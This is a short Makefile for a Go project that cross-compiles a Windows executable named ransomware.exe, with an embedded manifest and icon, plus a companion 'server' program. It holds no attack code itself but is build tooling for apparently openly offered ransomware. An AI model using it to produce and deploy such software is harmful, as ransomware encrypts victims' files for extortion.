.PHONY: all

ifeq ($(GOOS),"windows")
    BUILD := go build
else
    BUILD := env GOOS=windows go build
endif

all: build clean

pre-build:
	rsrc -manifest ransomware.exe.manifest -ico icon.ico -o ransomware.syso
	mkdir -p build

build: pre-build
	$(BUILD) && mv ransomware.exe build
	cd server && go build && mv `ls|grep server` ../build

clean:
	rm ransomware.syso